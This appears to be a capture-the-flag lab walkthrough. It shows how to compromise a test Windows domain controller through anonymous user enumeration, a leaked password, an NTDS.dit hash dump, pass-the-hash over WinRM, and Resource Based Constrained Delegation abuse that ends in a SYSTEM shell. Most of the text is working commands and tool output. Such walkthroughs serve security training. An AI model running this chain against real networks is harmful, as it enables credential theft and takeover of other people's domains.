____

# Exploitation Guide for Resourced

## Summary

In this guide, we will enumerate a domain controller to discover remnants of a password audit that will lead us to shell access. We will then leverage a Resource Based Constrained Delegation Exploitation vector to elevate to system access.

## Enumeration

### Nmap

We'll start by looking for open ports with an `nmap` scan.

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- 192.168.120.181 -T5
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-10 12:59 EST
Nmap scan report for 192.168.120.181
Host is up (0.038s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49703/tcp open  unknown
49769/tcp open  unknown
```

This appears to be a domain controller.

### Domain Controller Remote Enumeration

Let's use `rpcclient` to see if we can list the user accounts on the domain.

```
┌──(kali㉿kali)-[~]
└─$ rpcclient -W '' -c querydispinfo -U''%'' '192.168.120.181'     
index: 0xeda RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0xf72 RID: 0x457 acb: 0x00020010 Account: D.Durant       Name: (null)    Desc: Linear Algebra and crypto god
index: 0xf73 RID: 0x458 acb: 0x00020010 Account: G.Goldberg     Name: (null)    Desc: Blockchain expert
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xf6d RID: 0x452 acb: 0x00020010 Account: J.Johnson      Name: (null)    Desc: Networking specialist
index: 0xf6b RID: 0x450 acb: 0x00020010 Account: K.Keen Name: (null)    Desc: Frontend Developer
index: 0xf10 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xf6c RID: 0x451 acb: 0x00000210 Account: L.Livingstone  Name: (null)    Desc: SysAdmin
index: 0xf6a RID: 0x44f acb: 0x00020010 Account: M.Mason        Name: (null)    Desc: Ex IT admin
index: 0xf70 RID: 0x455 acb: 0x00020010 Account: P.Parker       Name: (null)    Desc: Backend Developer
index: 0xf71 RID: 0x456 acb: 0x00020010 Account: R.Robinson     Name: (null)    Desc: Database Admin
index: 0xf6f RID: 0x454 acb: 0x00020010 Account: S.Swanson      Name: (null)    Desc: Military Vet now cybersecurity specialist
index: 0xf6e RID: 0x453 acb: 0x00000210 Account: V.Ventz        Name: (null)    Desc: New-hired, reminder: HotelCalifornia194!
```

We were able to get a domain user list along with a note that alludes that the password for the `V.Ventz` account is `HotelCalifornia194!`. Let's check if this will allow us to connect to SMB using `smbclient`. We can list the shares with the `-L` flag.

```
┌──(kali㉿kali)-[~]
└─$ smbclient -L \\\\192.168.120.181\\ -U 'V.Ventz%HotelCalifornia194!'

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Password Audit  Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

Ooh, that **Password Audit** looks interesting. Let's access that and see what it contains.

```
┌──(kali㉿kali)-[~]
└─$ smbclient \\\\192.168.120.181\\Password\ Audit -U 'V.Ventz%HotelCalifornia194!'
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Oct  5 04:49:16 2021
  ..                                  D        0  Tue Oct  5 04:49:16 2021
  Active Directory                    D        0  Tue Oct  5 04:49:15 2021
  registry                            D        0  Tue Oct  5 04:49:16 2021

                7706623 blocks of size 4096. 2680915 blocks available
smb: \> 
```

These may be useful to us. Let's go ahead and download everything in both directories.

```
smb: \> prompt off
smb: \> recurse on
smb: \> mget *
getting file \Active Directory\ntds.dit of size 25165824 as Active Directory/ntds.dit (3174.4 KiloBytes/sec) (average 3174.4 KiloBytes/sec)
getting file \Active Directory\ntds.jfm of size 16384 as Active Directory/ntds.jfm (125.0 KiloBytes/sec) (average 3124.8 KiloBytes/sec)
getting file \registry\SECURITY of size 65536 as registry/SECURITY (470.6 KiloBytes/sec) (average 3079.7 KiloBytes/sec)
getting file \registry\SYSTEM of size 16777216 as registry/SYSTEM (3202.5 KiloBytes/sec) (average 3127.6 KiloBytes/sec)
smb: \> 
```

Let's see what we got.

```
┌──(kali㉿kali)-[~]
└─$ ls -l Active\ Directory
total 24592
-rw-r--r-- 1 kali kali 25165824 Jan 10 13:49 ntds.dit
-rw-r--r-- 1 kali kali    16384 Jan 10 13:49 ntds.jfm

┌──(kali㉿kali)-[~]
└─$ ls -l registry         
total 16448
-rw-r--r-- 1 kali kali    65536 Jan 10 13:49 SECURITY
-rw-r--r-- 1 kali kali 16777216 Jan 10 13:49 SYSTEM
```

This looks like an admin has performed a password audit on the domain controller but forgot to remove the mapped share. Since we now have the **NTDS.dit** file and **SYSTEM** hive, we can attempt retrieve domain user hashes. Let's pass these files into `impacket-secretsdump`.

```
┌──(kali㉿kali)-[~]
└─$ impacket-secretsdump -ntds Active\ Directory/ntds.dit -system registry/SYSTEM LOCAL
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x6f961da31c7ffaf16683f78e04c3e03d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 9298735ba0d788c4fc05528650553f94
[*] Reading and decrypting hashes from Active Directory/ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RESOURCEDC$:1000:aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b:::
M.Mason:1103:aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45:::
K.Keen:1104:aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c:::
L.Livingstone:1105:aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808:::
J.Johnson:1106:aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726:::
V.Ventz:1107:aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c:::
S.Swanson:1108:aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939:::
P.Parker:1109:aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe9d482123301dd19fe:::
R.Robinson:1110:aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac:::
D.Durant:1111:aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35:::
G.Goldberg:1112:aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2:::
...
```

Nice! Next, we will need to check if any users haven't changed their password since the audit occurred. To do this, we need to create a file containing the domain usernames and a file with the hashes.

```
┌──(kali㉿kali)-[~]
└─$ cat users   
Administrator
Guest
krbtgt
M.Mason
K.Keen
L.Livingstone
J.Johnson
V.Ventz
S.Swanson
P.Parker
R.Robinson
D.Durant
G.Goldberg

┌──(kali㉿kali)-[~]
└─$ cat hashes  
aad3b435b51404eeaad3b435b51404ee:12579b1666d4ac10f0f59f300776495f
aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
aad3b435b51404eeaad3b435b51404ee:9ddb6f4d9d01fedeb4bccfb09df1b39d
aad3b435b51404eeaad3b435b51404ee:3004b16f88664fbebfcb9ed272b0565b
aad3b435b51404eeaad3b435b51404ee:3105e0f6af52aba8e11d19f27e487e45
aad3b435b51404eeaad3b435b51404ee:204410cc5a7147cd52a04ddae6754b0c
aad3b435b51404eeaad3b435b51404ee:19a3a7550ce8c505c2d46b5e39d6f808
aad3b435b51404eeaad3b435b51404ee:3e028552b946cc4f282b72879f63b726
aad3b435b51404eeaad3b435b51404ee:913c144caea1c0a936fd1ccb46929d3c
aad3b435b51404eeaad3b435b51404ee:bd7c11a9021d2708eda561984f3c8939
aad3b435b51404eeaad3b435b51404ee:980910b8fc2e4fe982123301dd19fe
aad3b435b51404eeaad3b435b51404ee:fea5a148c14cf51590456b2102b29fac
aad3b435b51404eeaad3b435b51404ee:08aca8ed17a9eec9fac4acdcb4652c35
aad3b435b51404eeaad3b435b51404ee:62e16d17c3015c47b4d513e65ca757a2
```

Then, pass these files to `crackmapexec`.

```
┌──(kali㉿kali)-[~]
└─$ crackmapexec winrm 192.168.120.181 -u users -H hashes
WINRM       192.168.120.181 5985   RESOURCEDC       [*] Windows 10.0 Build 17763 (name:RESOURCEDC) (domain:resourced.local)
WINRM       192.168.120.181 5985   RESOURCEDC       [*] http://192.168.120.181:5985/wsman
WINRM       192.168.120.181 5985   RESOURCEDC       [-] resourced.local\Administrator:12579b1666d4ac10f0f59f300776495f
WINRM       192.168.120.181 5985   RESOURCEDC       [-] resourced.local\Administrator:31d6cfe0d16ae931b73c59d7e0c089c0
...
WINRM       192.168.120.181 5985   RESOURCEDC       [-] resourced.local\L.Livingstone:3004b16f88664fbebfcb9ed272b0565b
WINRM       192.168.120.181 5985   RESOURCEDC       [-] resourced.local\L.Livingstone:3105e0f6af52aba8e11d19f27e487e45
WINRM       192.168.120.181 5985   RESOURCEDC       [-] resourced.local\L.Livingstone:204410cc5a7147cd52a04ddae6754b0c
WINRM       192.168.120.181 5985   RESOURCEDC       [+] resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808 (Pwn3d!)
```

We have a working hash for the user `L.Livingstone`. Let's use these to connect using `evil-winrm`.

```
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 192.168.120.181 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808
...
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> whoami
resourced\l.livingstone
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> 
```

Success! We now have shell access as the user `L.Livingstone`.

## Escalation

### Local Windows Enumeration

Let's start by uploading a copy of `SharpHound.exe` and running it.

```
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> upload /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe
Info: Uploading /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe to C:\Users\L.Livingstone\Documents\SharpHound.exe                                                                                          

                                                             
Data: 1110696 bytes of 1110696 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> .\SharpHound.exe -c all
------------------------------------------------
Initializing SharpHound at 12:08 PM on 1/10/2022
------------------------------------------------

Resolved Collection Methods: Group, Sessions, LoggedOn, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container

[+] Creating Schema map for domain RESOURCED.LOCAL using path CN=Schema,CN=Configuration,DC=resourced,DC=local
[+] Cache File not Found: 0 Objects in cache

[+] Pre-populating Domain Controller SIDS
Status: 0 objects finished (+0) -- Using 19 MB RAM
Status: 66 objects finished (+66 66)/s -- Using 26 MB RAM
Enumeration finished in 00:00:01.4459832
Compressing data to .\20220110120802_BloodHound.zip
You can upload this file directly to the UI

SharpHound Enumeration Completed at 12:08 PM on 1/10/2022! Happy Graphing!
```

A zip file was created with the information collected by `SharpHound.exe`. Let's download it to our Kali host.

```
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> ls


    Directory: C:\Users\L.Livingstone\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/10/2022  12:08 PM           9343 20220110120802_BloodHound.zip
-a----        1/10/2022  12:08 PM          11781 N2NkZDYyMzItY2UxZi00N2ZkLTg4ZmQtNThlNjJlZDQ1NzJh.bin
-a----        1/10/2022  12:06 PM         833024 SharpHound.exe


*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> download 20220110120802_BloodHound.zip
Info: Downloading 20220110120802_BloodHound.zip to ./20220110120802_BloodHound.zip

                                                             
Info: Download successful!
```

Let's import this zip file into `Bloodhound`. We can quickly start up `Bloodhound` by using `Docker`.

```
┌──(kali㉿kali)-[~]
└─$ sudo docker run -it \    
  -p 7474:7474 \
  -e DISPLAY=unix$DISPLAY \
  -v /tmp/.X11-unix:/tmp/.X11-unix \
  --device=/dev/dri:/dev/dri \
  -v ~/Desktop/bloodhound/data:/data \
  --name bloodhound belane/bloodhound
```

In the `Bloodhound` window, select "Upload Data" from the menu on the right and navigate to the zip file we downloaded from the target.

With our data imported, we can enumerate over the information, looking for anything we can use to elevate our access. Looking through the user domain permissions, we discover that `L.Livingstone` has "GenericAll" privilege on the domain controller.

![Bloodhound screen](https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG-Practice_93_image_1_nwIBqy5f.png)

Bloodhound screen

We may be able to abuse a Resource Based Constrained Delegation and gain full privileges over the domain controller.

### Resource Based Constrained Delegation

Let's use our access with the `l.livingstone` account to create a new machine account on the domain. We can do with by using `impacket-addcomputer`.

```
┌──(kali㉿kali)-[~]
└─$ impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.120.181 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Successfully added machine account ATTACK$ with password AttackerPC1!.
```

We can verify that this machine account was added to the domain by using our `evil-winrm` session from before.

```
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> get-adcomputer attack


DistinguishedName : CN=ATTACK,CN=Computers,DC=resourced,DC=local
DNSHostName       :
Enabled           : True
Name              : ATTACK
ObjectClass       : computer
ObjectGUID        : 3fe60405-3692-4de9-8a20-917b234741b9
SamAccountName    : ATTACK$
SID               : S-1-5-21-537427935-490066102-1511301751-3601
UserPrincipalName :
```

With this account added, we now need a python script to help us manage the delegation rights. Let's grab a copy of [rbcd.py](https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py) and use it to set `msDS-AllowedToActOnBehalfOfOtherIdentity` on our new machine account.

```
┌──(kali㉿kali)-[~]
└─$ wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py  
...
┌──(kali㉿kali)-[~]
└─$ sudo python3 rbcd.py -dc-ip 192.168.120.181 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone                                  
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Starting Resource Based Constrained Delegation Attack against RESOURCEDC$
[*] Initializing LDAP connection to 192.168.120.181
[*] Using resourced\l.livingstone account with password ***
[*] LDAP bind OK
[*] Initializing domainDumper()
[*] Initializing LDAPAttack()
[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `ATTACK` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `RESOURCEDC`
[*] Delegation rights modified succesfully!
[*] ATTACK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy
```

We can confirm that this was successful by using our `evil-winrm` session.

```
*Evil-WinRM* PS C:\Users\L.Livingstone\Documents> Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity

Path Owner                  Access
---- -----                  ------
     BUILTIN\Administrators resourced\ATTACK$ Allow
```

We now need to get the administrator service ticket. We can do this by using `impacket-getST` with our privileged machine account.

```
┌──(kali㉿kali)-[~]
└─$ impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.120.181
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

This saved the ticket on our Kali host as **Administrator.ccache**. We need to export a new environment variable named `KRB5CCNAME` with the location of this file.

```
┌──(kali㉿kali)-[~]
└─$ export KRB5CCNAME=./Administrator.ccache
```

Now, all we have to do is add a new entry in **/etc/hosts** to point `resourcedc.resourced.local` to the target IP address and run `impacket-psexec` to drop us into a system shell.

```
┌──(kali㉿kali)-[~]
└─$ sudo sh -c 'echo "192.168.120.181 resourcedc.resourced.local" >> /etc/hosts'

┌──(kali㉿kali)-[~]
└─$ sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.120.181 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on resourcedc.resourced.local.....
[*] Found writable share ADMIN$
[*] Uploading file zZeQFeGQ.exe
[*] Opening SVCManager on resourcedc.resourced.local.....
[*] Creating service rEwK on resourcedc.resourced.local.....
[*] Starting service rEwK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2145]
(c) 2018 Microsoft Corporation. All rights reserved.
 
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> 
```

Success! We now have system access on the target system.
